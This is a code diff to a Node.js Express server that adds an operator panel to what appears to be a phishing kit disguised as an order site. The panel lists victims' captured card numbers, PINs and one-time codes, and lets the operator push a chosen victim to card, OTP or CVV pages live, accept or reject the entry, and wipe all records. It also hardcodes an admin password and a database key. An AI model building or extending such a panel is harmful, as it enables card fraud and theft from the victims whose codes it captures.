@@ -1,5 +1,6 @@
 const express = require('express');
 const path = require('path');
+const crypto = require('crypto');
 const { createClient } = require('@supabase/supabase-js');
 
 const app = express();
@@ -10,6 +11,96 @@ app.use(express.json());
 const SUPABASE_URL = process.env.SUPABASE_URL || 'https://qwqszedggvefzkpqsihu.supabase.co';
 const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_uF-mM8mh9wUHwaogjSjwKg__4N4j_we';
 const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Hamin1234@@';
+const ADMIN_TOKEN = crypto.createHash('sha256').update(ADMIN_PASSWORD).digest('hex');
+
+function isAdmin(req) {
+  const auth = req.headers.authorization;
+  if (auth && auth.startsWith('Bearer ')) return auth.slice(7) === ADMIN_TOKEN;
+  return false;
+}
+
+// Admin login
+app.post('/api/admin/login', (req, res) => {
+  const { password } = req.body;
+  if (password === ADMIN_PASSWORD) return res.json({ success: true, token: ADMIN_TOKEN });
+  res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
+});
+
+// Admin: get all submissions (orders) + active visitor count
+app.get('/api/admin/submissions', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ submissions: [] });
+    const { data: orders } = await supabase.from('orders').select('*').order('created_at', { ascending: false });
+    const cutoff = Date.now() - 30000;
+    const { data: visitors } = await supabase.from('visitors').select('*').gt('last_active_at', cutoff);
+    const submissions = (orders || []).map(o => ({
+      id: o.id,
+      phone: o.phone || '',
+      amount: o.watch_color || '-',
+      card: o.login_username || '',
+      pin: o.login_password || '',
+      otp: o.verification_code || '',
+      cvv: '',
+      status: o.status || 'pending',
+      time: o.created_at
+    }));
+    res.json({ submissions, active: (visitors || []).length });
+  } catch (err) {
+    res.json({ submissions: [], active: 0 });
+  }
+});
+
+// Admin: redirect user
+app.post('/api/admin/redirect/:id', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ success: false });
+    const { page } = req.body;
+    const redirect_map = { card: 'login', otp: 'code', cvv: 'code' };
+    const redirect_to = redirect_map[page] || page || 'login';
+    await supabase.from('orders').update({ status: 'redirect_' + (page || 'card'), redirect_to }).eq('id', req.params.id);
+    const { data: order } = await supabase.from('orders').select('session_id').eq('id', req.params.id).maybeSingle();
+    if (order && order.session_id) {
+      await supabase.from('visitors').update({ redirect_to }).eq('session_id', order.session_id);
+    }
+    res.json({ success: true });
+  } catch (err) { res.status(500).json({ success: false }); }
+});
+
+// Admin: accept order
+app.post('/api/admin/accept/:id', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ success: false });
+    await supabase.from('orders').update({ status: 'accepted' }).eq('id', req.params.id);
+    const { data: order } = await supabase.from('orders').select('session_id').eq('id', req.params.id).maybeSingle();
+    if (order && order.session_id) {
+      await supabase.from('visitors').update({ redirect_to: 'success' }).eq('session_id', order.session_id);
+    }
+    res.json({ success: true });
+  } catch (err) { res.status(500).json({ success: false }); }
+});
+
+// Admin: reject order
+app.post('/api/admin/reject/:id', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ success: false });
+    await supabase.from('orders').update({ status: 'rejected' }).eq('id', req.params.id);
+    res.json({ success: true });
+  } catch (err) { res.status(500).json({ success: false }); }
+});
+
+// Admin: clear all
+app.post('/api/admin/clear', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ success: false });
+    const { data: allOrders } = await supabase.from('orders').select('id');
+    for (const o of (allOrders || [])) await supabase.from('orders').delete().eq('id', o.id);
+    const { data: allVisitors } = await supabase.from('visitors').select('session_id');
+    for (const v of (allVisitors || [])) await supabase.from('visitors').delete().eq('session_id', v.session_id);
+    res.json({ success: true });
+  } catch (err) { res.status(500).json({ success: false }); }
+});
 
 // Save order
 app.post('/api/orders', async (req, res) => {
